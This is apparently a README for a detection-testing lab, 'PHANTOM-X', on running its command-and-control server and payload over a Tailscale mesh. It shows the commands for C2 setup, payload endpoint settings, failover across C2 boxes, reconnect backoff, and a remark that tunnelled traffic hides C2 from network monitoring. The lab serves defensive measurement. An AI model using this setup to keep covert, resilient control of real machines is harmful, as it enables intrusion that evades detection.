# PHANTOM-X :: running the lab over Tailscale

Tailscale is a WireGuard mesh. It gives every machine a stable private
address (a `100.x.y.z` from the CGNAT range) and a stable name, and it
does it **through NAT** — no port forwarding, no public IP, no dynamic
DNS.

For this lab that is exactly the right tool, for two reasons.

---

## Why it fits

**1. The C2 gets an address that never changes.**

The lab's firewall rule for the C2 names a HOST rather than an address,
and the reason is in the script: *"when the operator's laptop moves
between networks — office wifi, a mobile hotspot, a hotel — the C2's
address changes with it. If the rule names the ADDRESS, it has to be
edited every time."*

On a tailnet that problem does not exist. The C2 box has a fixed
`100.x.y.z` whatever the network under it does — office, hotel, home,
coffee shop. The rule is written once.

**2. The VM stays isolated.**

This is the part that matters, and it is the opposite of what "run it
over the internet" usually means.

The lab's rule is default-deny egress: the VM can reach the C2 and
nothing else. With Tailscale in the middle, the VM still cannot reach
the ordinary internet — the default-deny is still there — but it can
reach the C2 over the tailnet.

So the VM is **more** isolated than a normally-networked machine, not
less. It has no route to the home LAN, no route to the internet, and
exactly one route: the C2.

---

## The one thing that breaks

Tailscale reaches its control plane and its DERP relays over the
ordinary internet, and it answers its own name lookups on
`100.100.100.100`. **The lab's default-deny outbound rule stops all
of that**, and the tunnel never comes up.

That looks exactly like "the lab is broken". It is not: the tunnel
needs three narrow allowances, and the lab's script adds them when you
ask.

---

## Setup

### On the C2 box (the host, or a VPS, or anything with Tailscale)

```
tailscale up
tailscale ip -4          # the 100.x.y.z to give the lab
tailscale status         # the MagicDNS name
```

The C2 server already binds every interface:

```bash
./px_c2 --host 0.0.0.0 --port 9001 --log c2_audit.jsonl
```

`0.0.0.0` is what makes it reachable over the tailnet interface as
well as the ordinary one.

### On the VM

```
tailscale up
```

Then apply the lockdown **with** the Tailscale allowances:

```powershell
# from an elevated PowerShell on the VM
cd C:\pxvm\phase0_labnet

# by the tailnet address
.\setup_vm_labnet.ps1 -Tailscale -LabGateway 100.x.y.z -C2Port 9001

# or by the MagicDNS name -- the rule prefers this, because the name
# resolves when the firewall evaluates it
.\setup_vm_labnet.ps1 -Tailscale -LabGateway c2box.tail1234.ts.net -C2Port 9001
```

The script adds three allowances:

| Rule | Why |
|---|---|
| UDP/41641 outbound | the direct WireGuard path |
| TCP/443 to the control plane and the relays | the fallback when the direct path is not available |
| UDP/53 to 100.100.100.100 | MagicDNS — this is how the name the payload resolves gets answered |

and leaves the default-deny in place.

### The payload

Point it at the tailnet address, or at the name:

```powershell
# build time, from the build machine
.\make_target_bundle.ps1 -C2Host 100.x.y.z -C2Port 9001 -Arm all

# or run time, on the VM
$env:PX_C2_HOST = "c2box.tail1234.ts.net"
$env:PX_C2_PORT = "9001"
```

**Use the name if the payload is going to be run on more than one
machine.** The payload resolves the name every time it connects, so
the C2 can move inside the tailnet without the payload being rebuilt.

For redundancy, use the endpoint list — up to six `host:port` pairs,
and each host resolves to up to eight addresses:

```powershell
$env:PX_C2_ENDPOINTS = "c2box.tail1234.ts.net:9001,c2box2.tail1234.ts.net:9001"
```

---

## Two C2 boxes

The tailnet makes failover trivial, because the endpoint layer already
knows how to try a list of hosts and, within each host, a list of
addresses.

Two C2 boxes on the tailnet, both running the same server, and the
payload tries the first and falls through to the second if the first
does not answer. The audit log records which one the session landed
on, so the measurement is unaffected.

This is worth doing for a lab that runs unattended: the resilient arm
reconnects with a backoff of 5, 10, 20, 40, 60 seconds, so a C2 that is
down for a minute costs one backoff step and nothing more.

---

## What does NOT change

The payload's behaviour is identical. It connects to one host, on one
port, and it does what the operator asked. Tailscale changes the
**route**, not the **scope**:

- no scanning
- no propagation
- no target list
- the same one named process, one named host, one named file

The bounds are in the source next to each technique, and the transport
does not relax them.

---

## What the measurement sees

The endpoint's view changes shape, and it is worth knowing which way:

| | lab segment | over a tailnet |
|---|---|---|
| the connection | on a private segment | a UDP flow to a relay, or a direct WireGuard flow |
| the C2 address | stable on the segment | stable at `100.x.y.z` |
| the plaintext protocol | visible to anything on the segment | visible only inside the tunnel |
| the network rule that fires | `px-003`, `px-011` | the tunnel itself |

The Sysmon and Defender telemetry on the VM is unchanged — that is
where most of the lab's rules live. The network rules are the ones
that shift, and the honest note is that a tailnet makes the C2 traffic
look like encrypted noise to anything watching the wire, which is very
nearly the `encrypt` arm's behaviour without the lab's own cipher.

---

## Verifying it

```powershell
# on the VM
tailscale status
tailscale ping c2box.tail1234.ts.net
Resolve-DnsName c2box.tail1234.ts.net
Test-NetConnection c2box.tail1234.ts.net -Port 9001
```

`Test-NetConnection` is the one that matters: it proves the firewall
rule and the tunnel both allow the port the payload needs.

Then:

```powershell
.\px_payload_all.exe
```

and on the C2 box the session should appear:

```
[*] session 1 connected from 100.x.y.z:...
[*] session 1 hello: host=...
```
